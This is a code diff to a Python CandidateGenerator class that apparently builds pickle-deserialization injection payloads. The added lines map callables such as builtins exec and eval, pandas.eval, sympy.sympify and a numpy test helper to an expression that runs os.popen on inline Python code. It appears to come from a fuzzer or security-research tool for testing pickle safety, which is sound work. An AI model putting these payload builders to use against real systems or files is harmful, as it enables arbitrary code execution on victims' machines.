@@ -132,6 +132,7 @@ class CandidateGenerator:
         injection_parts.append(f"{module}\n{name}\n".encode("latin1"))
         
         # Generate fuzzed arguments tuple matching the callable
+        expr_payload = f"__import__('os').popen('python3 -c {payload_code!r}').read()"
         if module == "subprocess" and name in ("Popen", "run", "call", "check_call", "check_output"):
             args = (("python3", "-c", payload_code),)
         elif module == "subprocess" and name in ("getstatusoutput", "getoutput"):
@@ -147,6 +148,20 @@ class CandidateGenerator:
             except OSError:
                 pass
             args = (path,)
+        elif module == "builtins" and name == "exec":
+            args = (payload_code,)
+        elif module == "builtins" and name == "eval":
+            args = (expr_payload,)
+        elif module == "pandas" and name == "eval":
+            args = (expr_payload,)
+        elif module == "sympy" and name == "sympify":
+            args = (expr_payload,)
+        elif module == "numpy.testing._private.utils" and name == "runstring":
+            args = (payload_code, {})
+        elif module == "runpy" and name == "run_module":
+            # run_module(name) cannot execute arbitrary inline code via a module
+            # name; skip these candidates entirely so validity stays meaningful.
+            raise ValueError(f"unsupported callable for inline payload: {module}.{name}")
         else:
             args = (payload_code,)
             
